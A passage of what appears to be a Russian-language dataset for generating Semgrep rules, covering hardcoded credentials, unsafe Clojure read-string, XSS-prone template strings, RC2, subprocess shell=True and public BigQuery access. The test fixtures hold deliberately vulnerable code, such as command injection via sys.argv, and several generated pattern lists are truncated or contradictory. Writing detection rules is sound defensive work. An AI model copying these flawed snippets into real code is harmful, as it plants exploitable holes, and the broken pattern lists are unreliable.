    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-369: Divide By Zero\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: divide-by-zero.rb\n def divide_by_zero\n   # ruleid: divide-by-zero\n   3/0\n   # ruleid: divide-by-zero\n   oops = 4/0\n   variable = 3\n   # ruleid: divide-by-zero\n   oops = variable / 0\n\n   zero = 0\n   # ruleid: divide-by-zero\n   bad = variable/zero\n\n   # ok: divide-by-zero\n   ok = 1.0 / 0\n   # ok: divide-by-zero\n   ok2 = 2.0 / zero\n   \n end  # Ограничиваем длину\n\nОпасные паттерны:\n• 3/0\n• 4/0\n• variable / 0\n\nБезопасные паттерны:  \n• 1.0 / 0\n• 2.0 / zero\n\nЛегенда аннотаций:\n- // ruleid:divide-by-zero: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:divide-by-zero: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: divide-by-zero\n  message: >-\n    Detected a possible ZeroDivisionError.\n  metadata:\n    cwe:\n    - 'CWE-369: Divide By Zero'\n    references:\n    - https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_divide_by_zero.rb\n    category: security\n    technology:\n    - ruby\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n  languages:\n  - ruby\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $VAR\n    - metavariable-regex:\n        metavariable: $VAR\n        regex: ^\\d*(?!\\.)$\n  pattern-sinks:\n  - patterns:\n    - pattern-inside: $NUMER / 0\n    - pattern: $NUMER\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных ошибок деления на ноль в Ruby-коде. Анализ выполняется методом taint. Источниками (sources) являются переменные, содержащие только цифры (без десятичных точек). Синками (sinks) считаются выражения, где числитель делится на ноль или выражение, содержащее метапеременную $NUMER, внутри которого происходит деление на ноль.\n\n# Ключевые элементы:\n- ID: divide-by-zero\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "divide-by-zero",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: build-gradle-password-hardcoded\nОписание уязвимости: A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. It is recommended to rotate the secret and retrieve them from a secure secret vault or Hardware Security Module (HSM), alternatively environment variables can be used if allowed by your company policy.\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: kotlin",
    "input": "Требования:\n- Язык: kotlin\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: build-gradle-password-hardcoded.build.gradle.kts\nimport org.gradle.api.tasks.testing.logging.TestExceptionFormat\nimport org.gradle.api.tasks.testing.logging.TestLogEvent\nimport org.jetbrains.kotlin.gradle.tasks.KotlinCompile\n\nplugins {\n    val kotlinVersion = \"1.8.0\"\n\n    id(\"org.springframework.boot\") version \"3.1.1\"\n    id(\"io.spring.dependency-management\") version \"1.1.0\"\n    id(\"io.gitlab.arturbosch.detekt\") version \"1.22.0\"\n    kotlin(\"jvm\") version kotlinVersion\n    kotlin(\"plugin.spring\") version kotlinVersion\n    id(\"org.sonarqube\") version \"3.0\"\n    id(\"org.springdoc.openapi-gradle-plugin\") version \"1.6.0\"\n    jacoco\n    application\n}\n\ngroup = \"test\"\nversion = \"latest\"\n\nval javaVersion = \"17\"\nval koTestVersion = \"5.5.5\"\nval mockkVersion = \"1.13.4\"\nval runDetekt = !project.hasProperty(\"noDetekt\")\n\nval file = File(\"$rootDir/.git\")\nval gitDir = if (file.isFile) \"$rootDir/${file.readText().split(\": \").last().trim()}\" else \"$rootDir/.git\"\n\njava {\n    sourceCompatibility = JavaVersion.VERSION_17\n}\n\nrepositories {\n    if (System.getProperty(\"build-in-runner\")?.toBoolean() == true) {\n        maven {\n            url = uri(\"https://art.test.test/artifactory/maven/\")\n        }\n    } else {\n        mavenLocal()\n        mavenCentral()\n    }\n    maven {\n        val env = System.getenv()\n\n        url = uri(env[\"LIBRARY_URL\"] ?: \"https://art.test.test/artifactory/maven-some-dev\")\n        credentials {\n            username = env[\"LIBRARY_USER_1\"] ?: \"maven-first-dev\"\n            // ruleid: build-gradle-password-hardcoded\n            password = env[\"LIBRARY_PASS_1\"] ?: \"jWnyxxxxxxxxxxX7ZQxxxxxxxx\"\n \n            username = env[\"LIBRARY_USER_2\"] ?: \"maven-second-dev\"\n            // ok: build-gradle-password-hardcoded\n            password = env[\"LIBRARY_PASS_2\"] \n        }\n    }\n}\n\ndependencyManagement {\n    imports {\n        mavenBom(\"de.codecentric:spring-boot-admin-dependencies:3.2.1\")\n    }\n}\n\ndependencies {\n    detektPlugins(\"io.gitlab.arturbosch.detekt:detekt-for  # Ограничиваем длину\n\nОпасные паттерны:\n• password = env['LIBRARY_PASS'] ?: \"hardcoded-value\"\n• val pass = env['SECRET_KEY'] ?: \"another-hardcoded-value\"\n• private const val PASSWORD = \"very-secret-password\"\n\nБезопасные паттерны:  \n• username = env['USERNAME']\n• password = env['PASSWORD']\n• val secretKey = System.getenv('SECRET_KEY')\n\nЛегенда аннотаций:\n- // ruleid:build-gradle-password-hardcoded: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:build-gradle-password-hardcoded: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: build-gradle-password-hardcoded\n  message: A secret is hard-coded in the application. Secrets stored in source code,\n    such as credentials, identifiers, and other types of sensitive data, can be leaked\n    and used by internal or external malicious actors. It is recommended to rotate\n    the secret and retrieve them from a secure secret vault or Hardware Security Module\n    (HSM), alternatively environment variables can be used if allowed by your company\n    policy.\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n    category: security\n    subcategory:\n    - vuln\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    cwe2020-top25: true\n    cwe2021-top25: true\n    cwe2022-top25: true\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    technology:\n    - secrets\n    vulnerability_class:\n    - Hard-coded Secrets\n    source_rule_url: https://semgrep.dev/playground/r/d8Ur5BA/achufistov6_personal_org.build-gradle-password-hardcoded\n  languages:\n  - kotlin\n  options:\n    symbolic_propagation: true\n  patterns:\n  - pattern-either:\n    - pattern: '$PASS = env[...] ?: $VALUE'\n  - metavariable-regex:\n      metavariable: $PASS\n      regex: (password|pass|passwd|loginPassword)\n  - metavariable-pattern:\n      language: generic\n      metavariable: $VALUE\n      patterns:\n      - pattern-either:\n        - pattern-regex: ^[A-Za-z0-9/+=]+$\n  paths:\n    include:\n    - \"*build.gradle.kts\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных секретов (в данном случае паролей) в файле build.gradle.kts. Оно использует комбинацию метапеременных и регулярных выражений для идентификации переменных, содержащих слова, связанные с паролями или идентификаторами пользователей, а также проверяет наличие жестко закодированных значений этих переменных. Правило применимо только к файлам с расширением .build.gradle.kts и ищет конструкции, где пароль явно задан внутри файла, вместо использования переменной окружения.\n\n# Ключевые элементы:\n- ID: build-gradle-password-hardcoded\n- Язык: kotlin \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "build-gradle-password-hardcoded",
      "language": "kotlin",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: read-string-unsafe\nОписание уязвимости: The default core Clojure read-string method is dangerous and can lead to deserialization vulnerabilities. Use the edn/read-string instead.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: clojure",
    "input": "Требования:\n- Язык: clojure\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: read-string-unsafe.clj\n(ns clojure-read-string-not-vulnerable\n(:refer-clojure :exclude [read read-string]))\n\n(defn read-string [^\"[B\" v]\n  (String. v))\n\n(defn not-vulnerable [x]\n// ok: read-string-unsafe\n  (read-string x))\n\n(ns clojure-read-string\n  (:require [clojure.edn :as edn]))\n\n(defn vulnerable [x]\n// ruleid: read-string-unsafe\n  (read-string x))\n\n(defn not-vulnerable [x]\n  (edn/read-string x))  # Ограничиваем длину\n\nОпасные паттерны:\n• (read-string \"some untrusted data\")\n• (let [data \"malicious input\"] (read-string data))\n• (defn unsafe-fn [] (read-string \"attack payload\"))\n\nБезопасные паттерны:  \n• (edn/read-string \"safe edn data\")\n• (let [data \"safe edn string\"] (edn/read-string data))\n• (defn safe-fn [] (edn/read-string \"valid edn input\"))\n\nЛегенда аннотаций:\n- // ruleid:read-string-unsafe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:read-string-unsafe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: read-string-unsafe\n  metadata:\n    author: Gabriel Marquet <gab.marquet@gmail.com>\n    category: security\n    confidence: LOW\n    references:\n    - http://www.learningclojure.com/2013/02/clojures-reader-is-unsafe.html#post-body-2898830171141471587\n    - https://ericnormand.me/article/clojure-web-security\n    - https://github.com/jafingerhut/jafingerhut.github.com/blob/master/clojure-info/using-edn-safely.md#vulnerabilities-in-clojurecores-read-and-read-string\n    source-rule-url: https://github.com/clj-holmes/clj-holmes-rules/tree/main/security/clojure-read-string\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    likelihood: MEDIUM\n    impact: HIGH\n    subcategory: \n      - audit\n    cwe2022-top25: true\n    cwe2021-top25: true\n    cwe2020-top25: true\n    technology: \n      - clojure\n  patterns:\n  - pattern-not-inside: |\n      (ns ...\n      (... :exclude [read read-string]))\n      ...\n      (defn $VAR [$X]...)\n  - pattern-inside: |\n      (defn $VAR [$X]...)\n  - pattern: |\n      (read-string $X)\n  message: >-\n    The default core Clojure read-string method is dangerous and can lead to\n    deserialization vulnerabilities. Use the edn/read-string instead.\n  languages:\n  - clojure\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасной функции read-string в языке Clojure. Анализ выполняется путем поиска вызова функции read-string вне контекста исключения функций read и read-string через механизм pattern-not-inside. Правило также исключает случаи, когда функция read-string явно исключена при использовании оператора :exclude в пространстве имен. В случае обнаружения вызова read-string выдается сообщение о потенциальной угрозе десериализации.\n\n# Ключевые элементы:\n- ID: read-string-unsafe\n- Язык: clojure \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "read-string-unsafe",
      "language": "clojure",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: html-in-template-string\nОписание уязвимости: This template literal looks like HTML and has interpolated variables. These variables are not HTML-encoded by default. If the variables contain HTML tags, these may be interpreted by the browser, resulting in cross-site scripting (XSS).\nCWE: CWE-116: Improper Encoding or Escaping of Output\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-116: Improper Encoding or Escaping of Output\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: html-in-template-string.js\n\n// ok: html-in-template-string\nconst planet = `world`;\nconst greeting = \"hello\";\n\n// ok: html-in-template-string\nlet a = `hello ${planet}`;\n\n// ruleid: html-in-template-string\nlet b = `<h1>hello ${planet}</h1>`;\n\n// ruleid: html-in-template-string\nlet start = `<h1>hello ${planet}`;\n\n// ruleid: html-in-template-string\nlet end = `${planet}</h1><b>foo</b>`;\n\n// ruleid: html-in-template-string\nlet two = `<h1>${greeting} beautiful ${planet}</h1>`;\n\nfunction createHtml() {\n    // from issue #1385\n    // ruleid: html-in-template-string\n    return `<div style=${style.color}>${content}</div>`\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• let b = `<h1>hello ${planet}</h1>`;\n• let start = `<h1>hello ${planet}`;\n• let end = `${planet}</h1><b>foo</b>`;\n\nБезопасные паттерны:  \n• const planet = `world`; const greeting = \"hello\"; let a = `hello ${planet}`;\n• let a = `hello ${planet}`;\n\nЛегенда аннотаций:\n- // ruleid:html-in-template-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:html-in-template-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: html-in-template-string\n  message: >-\n    This template literal looks like HTML and has interpolated variables.\n    These variables are not HTML-encoded by default. If the variables contain\n    HTML tags, these may be interpreted by the browser, resulting in cross-site\n    scripting (XSS).\n  metadata:\n    cwe:\n    - 'CWE-116: Improper Encoding or Escaping of Output'\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - javascript\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern: |\n        `$HTML${$VAR}...`\n    - pattern: |\n        `...${$VAR}$HTML`\n  - metavariable-regex:\n      metavariable: $HTML\n      regex: .*</?[a-zA-Z]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска шаблонных литералов JavaScript, которые выглядят как HTML и содержат интерполированные переменные. Переменные не подвергаются HTML-кодированию по умолчанию, что может привести к интерпретации браузером HTML-тегов, вызывая кросс-сайт инжекцию (XSS). Правило использует два шаблона: первый ищет шаблонный литерал, начинающийся с HTML-тега и содержащий переменную ($HTML${$VAR}), второй — шаблонный литерал, заканчивающийся тегом HTML и содержащим переменную ($VAR)$HTML. Шаблон также включает регулярное выражение для метавариабельной $HTML, которое соответствует любой строке, оканчивающейся на </? [a-zA-Z], что позволяет обнаруживать потенциально опасные конструкции.\n\n# Ключевые элементы:\n- ID: html-in-template-string\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "html-in-template-string",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-openai\nОписание уязвимости: Possibly found usage of AI: OpenAI\nCWE: \nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-openai.go\npackage gpt\n\n// ruleid: detect-openai\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"errors\"\n\t\"fmt\"\n\t\"strings\"\n\t\"sync\"\n\t\"time\"\n\n\tgogpt \"github.com/sashabaranov/go-openai\"\n)\n\nvar ErrTooManyRequests = errors.New(\"too many requests\")\n\ntype Config struct {\n\tKeys    []string\n\tTimeout time.Duration\n}\n\ntype Client struct {\n\tid int\n\t*gogpt.Client\n}\n\ntype Handler struct {\n\tsync.Mutex\n\tcfg     Config\n\tindex   int\n\tclients []*Client\n}\n\ntype expectedType struct {\n\tTranslations []string `json:\"translations\"`\n}\n\nfunc New(cfg Config) *Handler {\n\th := &Handler{\n\t\tcfg:     cfg,\n\t\tclients: make([]*Client, len(cfg.Keys)),\n\t}\n\tfor i, key := range cfg.Keys {\n\t\tc := &Client{\n\t\t\tid:     i,\n            // ruleid: detect-openai\n\t\t\tClient: gogpt.NewClient(key),\n\t\t}\n\t\th.clients[i] = c\n\t}\n\treturn h\n}\n\nfunc (h *Handler) Translate(ctx context.Context, src, lang string) (string, error) {\n\tctx, cancel := context.WithTimeout(ctx, h.cfg.Timeout)\n\tdefer cancel()\n\th.Lock()\n\tclient := h.clients[h.index]\n\th.index = (h.index + 1) % len(h.clients)\n\th.Unlock()\n\n\tmsg := gogpt.ChatCompletionMessage{\n\t\tRole: \"user\", Content: fmt.Sprintf(\"Translate \\\"%s\\\" to %s. Give the result directly. Don't explain. Don't quote output.\", src, lang),\n\t}\n\n\trequest := gogpt.ChatCompletionRequest{\n\t\tModel: \"gpt-3.5-turbo\",\n\t\tMessages: []gogpt.ChatCompletionMessage{\n\t\t\tmsg,\n\t\t},\n\t\tMaxTokens:   1024,\n\t\tStop:        []string{\"STOP\"},\n\t\tTemperature: 0.1,\n\t}\n\n\tresp, err := client.CreateChatCompletion(ctx, request)\n\tif err != nil {\n\t\tvar perr *gogpt.APIError\n\n\t\tif errors.As(err, &perr) {\n\t\t\tif perr.HTTPStatusCode == 429 {\n\t\t\t\treturn \"\", ErrTooManyRequests\n\t\t\t}\n\t\t}\n\n\t\tvar cerr *gogpt.RequestError\n\t\tif errors.As(err, &cerr) {\n\t\t\tif cerr.HTTPStatusCode == 429 {\n\t\t\t\treturn \"\", ErrTooManyRequests\n\t\t\t}\n\t\t}\n\n\t\tif errors.Is(err, context.DeadlineExceeded) {\n\t\t\treturn \"\", ErrTooManyRequests\n\t\t}\n\n\t\treturn \"\", err\n\t}\n\n\tresult := \"\"\n\tif len(resp.Choices) > 0 {\n\t\tresult = strings.TrimSpace(resp.Choices[0].Message.Content)\n\t}\n\tret  # Ограничиваем длину\n\nОпасные паттерны:\n• import \"github.com/sashabaranov/go-openai\"\n\nvar client *gogpt.Client\nclient = gogpt.NewClient(\"key\")\n• import _ \"github.com/sashabaranov/go-openai\"\ngogpt.NewClient(\"key\")\n\nБезопасные паттерны:  \n• import \"github.com/sashabaranov/openai\"\n\ngoOpenai.NewClient(\"key\")\n• import _ \"github.com/sashabaranov/go-openai\"\n\nЛегенда аннотаций:\n- // ruleid:detect-openai: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-openai: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-openai\n    languages:\n      - go\n    severity: INFO\n    message: \"Possibly found usage of AI: OpenAI\"\n    pattern-either:\n      - pattern: import \"github.com/sashabaranov/go-openai\"\n      - pattern: gogpt.NewClient(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможного использования API OpenAI в Go-коде. Анализ выполняется путем поиска импортов пакета 'github.com/sashabaranov/go-openai' и вызовов функции 'gogpt.NewClient(...)', которые могут указывать на применение OpenAI. Правило использует оператор 'pattern-either', чтобы охватить оба возможных шаблона.\n\n# Ключевые элементы:\n- ID: detect-openai\n- Язык: go \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-openai",
      "language": "go",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: insecure-cipher-algorithm-rc2\nОписание уязвимости: Detected RC2 cipher algorithm which is considered insecure. This algorithm is not cryptographically secure and can be reversed easily. Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits. When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-algorithm-rc2.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/ciphers.py\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Cipher import ARC2 as pycrypto_arc2\nfrom Crypto.Cipher import ARC4 as pycrypto_arc4\nfrom Crypto.Cipher import Blowfish as pycrypto_blowfish\nfrom Crypto.Cipher import DES as pycrypto_des\nfrom Crypto.Cipher import XOR as pycrypto_xor\nfrom Cryptodome.Cipher import ARC2 as pycryptodomex_arc2\nfrom Cryptodome.Cipher import ARC4 as pycryptodomex_arc4\nfrom Cryptodome.Cipher import Blowfish as pycryptodomex_blowfish\nfrom Cryptodome.Cipher import DES as pycryptodomex_des\nfrom Cryptodome.Cipher import XOR as pycryptodomex_xor\nfrom Crypto.Hash import SHA\nfrom Crypto import Random\nfrom Crypto.Util import Counter\n\nkey = b'Sixteen byte key'\niv = Random.new().read(pycrypto_arc2.block_size)\n# ruleid:insecure-cipher-algorithm-rc2\ncipher = pycrypto_arc2.new(key, pycrypto_arc2.MODE_CFB, iv)\n# deepruleid:insecure-cipher-algorithm-rc2\nmsg = iv + cipher.encrypt(b'Attack at dawn')\n# ruleid:insecure-cipher-algorithm-rc2\ncipher = pycryptodomex_arc2.new(key, pycryptodomex_arc2.MODE_CFB, iv)\n# deepruleid:insecure-cipher-algorithm-rc2\nmsg = iv + cipher.encrypt(b'Attack at dawn')\n\nkey = b'Sixteen byte key'\n# ok:insecure-cipher-algorithm-rc2\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\nplaintext = cipher.decrypt(ciphertext)\ntry:\n    cipher.verify(tag)\n    print(\"The message is authentic:\", plaintext)\nexcept ValueError:\n    print(\"Key incorrect or message corrupted\")  # Ограничиваем длину\n\nОпасные паттерны:\n• cipher = pycrypto_arc2.new(key, pycrypto_arc2.MODE_CFB, iv)\n• cipher = pycryptodomex_arc2.new(key, pycryptodomex_arc2.MODE_CFB, iv)\n\nБезопасные паттерны:  \n• cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n• // ok:insecure-cipher-algorithm-rc2\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-algorithm-rc2: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-algorithm-rc2: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-algorithm-rc2\n  message: >-\n    Detected RC2 cipher algorithm which is considered insecure. This algorithm\n    is not cryptographically secure and can be reversed easily.\n    Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits.\n    When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L84\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B304\n    references:\n    - https://cwe.mitre.org/data/definitions/326.html\n    - https://www.pycryptodome.org/src/cipher/cipher\n    category: security\n    technology:\n    - pycryptodome\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: HIGH\n    functional-categories:\n    - crypto::search::symmetric-algorithm::pycryptodome\n    - crypto::search::symmetric-algorithm::pycryptodomex\n  options:\n    symbolic_propagation: true\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: Cryptodome.Cipher.ARC2.new(...)\n  - pattern: Crypto.Cipher.ARC2.new(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования криптографического алгоритма RC2, который считается небезопасным. Алгоритм RC2 не является криптографически безопасным и может быть легко расшифрован. Правило использует оператор pattern-either для проверки наличия вызовов функций new() из модулей Cryptodome.Cipher.ARC2 и Crypto.Cipher.ARC2, которые соответствуют использованию шифра RC2.\n\n# Ключевые элементы:\n- ID: insecure-cipher-algorithm-rc2\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-algorithm-rc2",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: subprocess-shell-true\nОписание уязвимости: Found 'subprocess' function '$FUNC' with 'shell=True'. This is dangerous because this call will spawn the command using a shell process. Doing so propagates current shell settings and variables, which makes it much easier for a malicious actor to execute commands. Use 'shell=False' instead.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: subprocess-shell-true.py\nimport subprocess\nimport sys\n\n# ok:subprocess-shell-true\nsubprocess.call(\"echo 'hello'\")\n\n# ok:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]))\n\n# ok:subprocess-shell-true\nsubprocess.call(\"echo 'hello'\", shell=True)\n\n# ruleid:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]), shell=True)\n\n# ruleid:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]), shell=True, cwd=\"/home/user\")\n\n# ruleid:subprocess-shell-true\nsubprocess.run(\"grep -R {} .\".format(sys.argv[1]), shell=True)\n\n\n// File: subprocess-shell-true.fixed.py\nimport subprocess\nimport sys\n\n# ok:subprocess-shell-true\nsubprocess.call(\"echo 'hello'\")\n\n# ok:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]))\n\n# ok:subprocess-shell-true\nsubprocess.call(\"echo 'hello'\", shell=True)\n\n# ruleid:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]), shell=False)\n\n# ruleid:subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]), shell=False, cwd=\"/home/user\")\n\n# ruleid:subprocess-shell-true\nsubprocess.run(\"grep -R {} .\".format(sys.argv[1]), shell=False)  # Ограничиваем длину\n\nОпасные паттерны:\n• subprocess.call(\\\n\nБезопасные паттерны:  \n• subprocess.call(\\\n• )\n• subprocess.call(\\\n\nЛегенда аннотаций:\n- // ruleid:subprocess-shell-true: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:subprocess-shell-true: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: subprocess-shell-true\n  patterns:\n  - pattern: subprocess.$FUNC(..., shell=$TRUE, ...)\n  - metavariable-pattern:\n      metavariable: $TRUE\n      pattern: |\n        True \n  - pattern-not: subprocess.$FUNC(\"...\", shell=True, ...)\n  - focus-metavariable: $TRUE\n  message: >-\n    Found 'subprocess' function '$FUNC' with 'shell=True'. This is dangerous because\n    this call will spawn\n    the command using a shell process. Doing so propagates current shell settings\n    and variables, which\n    makes it much easier for a malicious actor to execute commands. Use 'shell=False'\n    instead.\n  fix: |\n    False\n  metadata:\n    source-rule-url: https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    references:\n    - https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess\n    - https://docs.python.org/3/library/subprocess.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - 'secure default'\n    likelihood: HIGH\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции 'subprocess' с параметром 'shell=True', который представляет угрозу безопасности, так как позволяет выполнять команды через оболочку, распространяя текущие настройки и переменные оболочки. Это увеличивает риск выполнения команд злоумышленником. Правило использует шаблон, проверяющий наличие вызова функции 'subprocess' с аргументом 'shell=True' и отсутствие такого же вызова с аргументами внутри строкового литерала. Шаблон также учитывает различные варианты написания функций 'subprocess', такие как 'call' и 'run'.\n\n# Ключевые элементы:\n- ID: subprocess-shell-true\n- Язык: python \n- Тип: secure default\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "subprocess-shell-true",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "secure default",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-bigquery-private-table-iam-member\nОписание уязвимости: Ensure that BigQuery Tables are not anonymously or publicly accessible\t\t\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-bigquery-private-table-iam-member.tf\n# ok: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"pass1\" {\n  cluster = \"my-private-table-member1\"\n  role    = \"roles/bigquery.connectionUser\"\n  member  = \"group:mygroup@example.com\"\n}\n\n# ok: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"pass2\" {\n  cluster = \"my-private-table-member2\"\n  role    = \"roles/bigquery.dataEditor\"\n  member  = \"domain:example.com\"\n}\n\n# fail\n# ruleid: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"fail1\" {\n  cluster = \"my-public-table-member1\"\n  role    = \"roles/bigquery.metadataViewer\"\n  member  = \"allAuthenticatedUsers\"\n}\n\n# fail\n# ruleid: gcp-bigquery-private-table-iam-member\nresource 